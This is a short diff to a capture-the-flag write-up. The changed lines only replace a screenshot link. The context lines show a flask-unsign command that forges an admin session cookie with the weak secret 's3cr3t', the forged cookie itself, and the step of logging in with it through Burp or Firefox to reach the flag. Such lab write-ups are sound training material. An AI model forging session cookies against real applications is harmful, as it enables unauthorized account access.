@@ -31,7 +31,8 @@ The admin might be **xXx-michel-xXx**  as say in the note of the challenge. So w
 With this command : `flask-unsign --sign --cookie "{'username': 'xXx-michel-xXx'}" --secret 's3cr3t'` we can have the admin cookie : `eyJ1c2VybmFtZSI6InhYeC1taWNoZWwteFh4In0.YjR-fg.n7h94NZbSUXDOBymQHaBuwVhZCQ`  
 
 Now if we try to login to the web app with this cookie (thanks to BURP or Firefox) we arrived on the admin page with the flag :  
-![image](https://user-images.githubusercontent.com/91023285/159005412-eca3c636-0950-4996-90bd-fe6c6254c232.png)
+![image](https://user-images.githubusercontent.com/91023285/159005756-24b880ee-9ee8-4741-ad38-d0f4f0e33788.png)
+
 
 
 <details>
